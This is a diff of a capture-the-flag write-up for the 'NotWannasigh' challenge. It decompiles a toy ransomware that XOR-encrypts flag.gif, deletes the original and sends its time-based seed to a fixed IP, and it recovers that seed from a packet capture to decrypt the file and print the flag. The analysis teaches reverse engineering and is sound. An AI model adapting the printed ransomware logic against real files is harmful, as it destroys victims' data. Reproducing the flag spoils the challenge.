@@ -1,5 +1,6 @@
-NotWannasigh
-100
+# NotWannasigh
+
+## Description
 
 Please help! An evil script-kiddie (seriously, this is some bad code) was able to get this ransomware "NotWannasigh" onto one of our computers. The program ran and encrypted our file "flag.gif".
 
@@ -21,7 +22,9 @@ http://us-east-1.linodeobjects.com/wpictf-challenge-files/ransomNote.txt
 http://us-east-1.linodeobjects.com/wpictf-challenge-files/flag-gif.EnCiPhErEd
 http://us-east-1.linodeobjects.com/wpictf-challenge-files/NotWannasigh.zip
 
+## What are we dealing with?
 
+```
 kali@kali:~/Downloads/wipctf/wannasigh$ ls -l
 total 384
 -rw-r--r-- 1 kali kali   1155 Apr 16 14:25 192-168-1-11_potential-malware.pcap
@@ -38,14 +41,15 @@ Archive:  NotWannasigh.zip
   inflating: NotWannasigh            
 kali@kali:~/Downloads/wipctf/wannasigh$ file NotWannasigh
 NotWannasigh: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ca17985d5f493aded88f81b8bfa47206118c6c9f, for GNU/Linux 3.2.0, not stripped
+```
 
+## Static analysis
 
 Open the binary in Ghidra and decompile.
-Let's start with main()... hold your nose.
+Let's start with `main()`... and hold your nose.
 
-
+```
 undefined8 main(void)
-
 {
   byte bVar1;
   int iVar2;
@@ -196,10 +200,11 @@ undefined8 main(void)
                    (alStack240 + uVar5 * 0x1ffffffffffffffe + uVar6 * 0x1ffffffffffffffe));
   return 0;
 }
-
+```
 
 So removing the useless lines...
 
+```
   local_50 = time((time_t *)0x0);
   srand((uint)local_50);
   local_54 = socket(2,1,0);
@@ -227,11 +232,13 @@ So removing the useless lines...
       }
     }
   }
+```
 
 That just phones home to a fixed IP address and sends a... I guess that's a randomly generated key based on the timestamp.
 
 Let's check out the tcpdump
 
+```
 kali@kali:~/Downloads/wipctf/wannasigh$ tcpdump -A -r 192-168-1-11_potential-malware.pcap
 reading from file 192-168-1-11_potential-malware.pcap, link-type EN10MB (Ethernet)
 16:11:46.103899 IP 192.168.1.11.39520 > 108.61.127.136.vultr.com.http: Flags [S], seq 4131822382, win 64240, options [mss 1460,sackOK,TS val 2564290710 ecr 0,nop,wscale 7], length 0
@@ -279,19 +286,22 @@ E..44.@.3.e.l=.......P.`.V@     .F.9.....S.....
 M...H
 16:11:46.469691 IP 192.168.1.11.39520 > 108.61.127.136.vultr.com.http: Flags [R], seq 4131822393, win 0, length 0
 E..(..@.@..W....l=...`.P.F.9....P....6..
-
+```
 
 From that tcpdump, the first 3 packets are a handshake (syn, syn/ack, ack).
 The fourth one has the srand value that was sent to the remote IP:
 
+```
 16:11:46.282091 IP 192.168.1.11.39520 > 108.61.127.136.vultr.com.http: Flags [P.], seq 1:11, ack 1, win 502, options [nop,nop,TS val 2564290888 ecr 3255699858], length 10: HTTP
 E..>n#@.@.......l=...`.P.F./.V>............
 ...H..  .1585599106
+```
 
 srand: 1585599106
 
-This next part of main() opens flag.gif for reading and prints the filesize:
+This next part of `main()` opens `flag.gif` for reading and prints the filesize:
 
+```
   puts("targetting flag.gif");
   local_60 = fopen("flag.gif","r+");
   fseek(local_60,0,2);
@@ -300,9 +310,11 @@ This next part of main() opens flag.gif for reading and prints the filesize:
   fseek(local_60,0,0);
   alStack240[0] = 0x1013f2;
   printf("fileSize = %d\n",(ulong)local_64);
+```
 
 This encrypts the stream:
 
+```
   local_70 = (long)(int)local_64 + -1;
   alStack240[3] = (long)(int)local_64;
   alStack240[4] = 0;
@@ -335,21 +347,27 @@ This encrypts the stream:
     local_40 = local_40 + 1;
   }
   alStack240[uVar5 * 0x1ffffffffffffffe + uVar6 * 0x1ffffffffffffffe] = 0x101543;
+```
 
-Close flag.gif
+Close `flag.gif`:
 
+```
   fclose(__stream,*(undefined *)
                    (alStack240 + uVar5 * 0x1ffffffffffffffe + uVar6 * 0x1ffffffffffffffe));
   alStack240[uVar5 * 0x1ffffffffffffffe + uVar6 * 0x1ffffffffffffffe] = 0x10154f;
+```
 
-Remove flag.gif
+Remove `flag.gif`:
 
+```
   remove("flag.gif",
          *(undefined *)(alStack240 + uVar5 * 0x1ffffffffffffffe + uVar6 * 0x1ffffffffffffffe));
   alStack240[uVar5 * 0x1ffffffffffffffe + uVar6 * 0x1ffffffffffffffe] = 0x101562;
+```
 
 Write the encrypted file
 
+```
   local_98 = fopen("flag-gif.EnCiPhErEd",&DAT_001020ae,
                    *(undefined *)
                     (alStack240 + uVar5 * 0x1ffffffffffffffe + uVar6 * 0x1ffffffffffffffe));
@@ -365,9 +383,11 @@ Write the encrypted file
   fclose(__stream,*(undefined *)
                    (alStack240 + uVar5 * 0x1ffffffffffffffe + uVar6 * 0x1ffffffffffffffe));
   alStack240[uVar5 * 0x1ffffffffffffffe + uVar6 * 0x1ffffffffffffffe] = 0x1015c1;
+```
 
 This last part obviously creates the ransom note:
 
+```
   __stream = fopen("ransomNote.txt",&DAT_001020ae,
                    *(undefined *)
                     (alStack240 + uVar5 * 0x1ffffffffffffffe + uVar6 * 0x1ffffffffffffffe));
@@ -383,12 +403,13 @@ This last part obviously creates the ransom note:
                    (alStack240 + uVar5 * 0x1ffffffffffffffe + uVar6 * 0x1ffffffffffffffe));
   return 0;
 }
+```
 
+It's just an XOR cipher, so it should be simple to reverse with that seed.
 
-It's just an XOR cipher.
-Here's the decryption program:
+## Write decryption program
 
-
+```
 kali@kali:~/Downloads/wipctf/wannasigh$ cat decrypt.c
 #include <stdio.h>
 #include <stdlib.h>
@@ -425,7 +446,11 @@ int main()
         fclose(in);
         return 0;
 }
+```
 
+## Get the flag
+
+```
 kali@kali:~/Downloads/wipctf/wannasigh$ gcc decrypt.c -o decrypt
 kali@kali:~/Downloads/wipctf/wannasigh$ ./decrypt
 kali@kali:~/Downloads/wipctf/wannasigh$ ls
@@ -434,9 +459,15 @@ decrypt                              flag.gif             NotWannasigh.zip
 decrypt.c                            flag-gif.EnCiPhErEd  ransomNote.txt
 kali@kali:~/Downloads/wipctf/wannasigh$ file flag.gif
 flag.gif: GIF image data, version 89a, 220 x 124
+```
 
 Open the gif in gimp and zoom in.
+
+![](NotWannasigh_flag.png)
+
 The flag is:
 
+```
 WPI{It_always_feels_a_little_weird_writing_malware}
+```
 
